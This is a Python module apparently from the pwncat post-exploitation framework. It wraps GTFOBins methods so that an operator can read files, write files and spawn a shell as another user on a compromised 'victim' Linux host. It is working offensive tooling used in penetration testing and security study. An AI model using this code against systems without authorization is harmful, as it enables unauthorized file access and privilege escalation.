#!/usr/bin/env python3
import shlex
import functools
import subprocess
from io import TextIOWrapper

import pwncat.subprocess
from pwncat.gtfobins import Stream, Capability
from pwncat.platform.linux import LinuxReader, LinuxWriter
from pwncat.modules.agnostic.enumerate.ability import (ExecuteAbility,
                                                       FileReadAbility,
                                                       FileWriteAbility)


class GTFOFileRead(FileReadAbility):
    """Utilize a GTFO Method Wrapper to implement the FileReadAbility"""

    def __init__(self, source, uid, method, **kwargs):
        super().__init__(source=source, uid=uid)

        self.method = method
        self.kwargs = kwargs

    def open(
        self,
        session,
        path: str,
        mode: str = "r",
        buffering: int = -1,
        encoding: str = "utf-8",
        errors: str = None,
        newline: str = None,
    ):
        """Read the file data using a GTFO bins reader"""

        if any(c not in "rb" for c in mode):
            raise ValueError("only r/b modes allowed")

        # Build the payload
        payload, input_data, exit_cmd = self.method.build(
            gtfo=session.platform.gtfo, lfile=path, **self.kwargs
        )

        # Send the command to the victim with the input and setup stdio pipes
        popen = session.platform.Popen(
            payload,
            shell=True,
            stdin=subprocess.PIPE,
            bufsize=buffering,
            bootstrap_input=input_data.encode("utf-8"),
        )

        # Wrap our file reader in a Linux specific file reader
        raw_reader = LinuxReader(
            popen,
            on_close=lambda filp: filp.popen.platform.channel.send(
                exit_cmd.encode("utf-8")
            ),
            name=path,
        )

        # Automatically decode to the specified encoding if requested
        if "b" not in mode:
            return TextIOWrapper(
                raw_reader,
                encoding=encoding,
                errors=errors,
                newline=newline,
                write_through=True,
                line_buffering=buffering == -1 or buffering == 1,
            )

        return raw_reader

    def title(self, session):
        user = session.find_user(uid=self.uid)
        return f"file read as [blue]{user.name}[/blue] via [cyan]{self.method.binary_path}[/cyan]"


class GTFOFileWrite(FileWriteAbility):
    """Utilize a GTFO Method Wrapper to implement the FileWriteAbility"""

    def __init__(self, source, uid, method, **kwargs):
        super().__init__(source=source, uid=uid)

        self.method = method
        self.kwargs = kwargs

    def open(
        self,
        session,
        path: str,
        mode: str = "w",
        buffering: int = -1,
        encoding: str = "utf-8",
        errors: str = None,
        newline: str = None,
    ):
        """Read the file data using a GTFO bins reader"""

        if any(c not in "wb" for c in mode):
            raise ValueError("only w/b modes allowed")

        # Build the payload
        payload, input_data, exit_cmd = self.method.build(
            gtfo=session.platform.gtfo, lfile=path, **self.kwargs
        )

        # Send the command to the victim with the input and setup stdio pipes
        popen = session.platform.Popen(
            payload,
            shell=True,
            stdin=subprocess.PIPE,
            bufsize=buffering,
            bootstrap_input=input_data.encode("utf-8"),
        )

        # Wrap our file writer in a Linux specific file reader
        raw_writer = LinuxWriter(
            popen,
            on_close=lambda filp: filp.popen.platform.channel.send(
                exit_cmd.encode("utf-8")
            ),
            name=path,
        )

        # Automatically decode to the specified encoding if requested
        if "b" not in mode:
            return TextIOWrapper(
                raw_writer,
                encoding=encoding,
                errors=errors,
                newline=newline,
                write_through=True,
                line_buffering=buffering == -1 or buffering == 1,
            )

        return raw_writer

    def title(self, session):
        user = session.find_user(uid=self.uid)
        return f"file write as [blue]{user.name}[/blue] via [cyan]{self.method.binary_path}[/cyan]"


class GTFOExecute(ExecuteAbility):
    """Execute a remote binary with a given GTFObins capability"""

    def __init__(self, source, uid, method, **kwargs):
        super().__init__(source=source, uid=uid)

        self.method = method
        self.kwargs = kwargs

    def send_command(self, session, command: bytes):
        """Send the command to the target for this GTFObin"""

        # Figure out what shell to use based on the environment
        shell = session.platform.getenv("SHELL")
        if shell is None:
            shell = "/bin/sh"

        # Build the full command
        if command is not None:
            full_command = shlex.join(
                [shell, "-c", command.decode("utf-8").rstrip("\n")]
            )
        else:
            full_command = shell

        # Construct the GTFObins payload
        payload, input_data, exit_cmd = self.method.build(
            gtfo=session.platform.gtfo, shell=full_command, **self.kwargs
        )

        # Send the payload
        session.platform.channel.send(payload.encode("utf-8") + b"\n")

        # Send the input needed to trigger execution
        session.platform.channel.send(input_data)

    def Popen(self, session, *args, **kwargs):
        """Emulate the platform.Popen method for execution as another user"""

        return session.platform.Popen(
            *args,
            **kwargs,
            send_command=functools.partial(self.send_command, session),
        )

    def run(self, session, *args, **kwargs):
        """Emulate the `platform.run` method for execution as another user"""

        return session.platform.run(
            *args, **kwargs, popen_class=functools.partial(self.Popen, session)
        )

    def shell(self, session):
        """Replace the running shell with a shell as another user"""

        shell = session.platform.getenv("SHELL")

        self.send_command(session, shell.encode("utf-8") + b"\n")

    def title(self, session):
        user = session.find_user(uid=self.uid)
        return f"shell as [blue]{user.name}[/blue] via [cyan]{self.method.binary_path}[/cyan]"
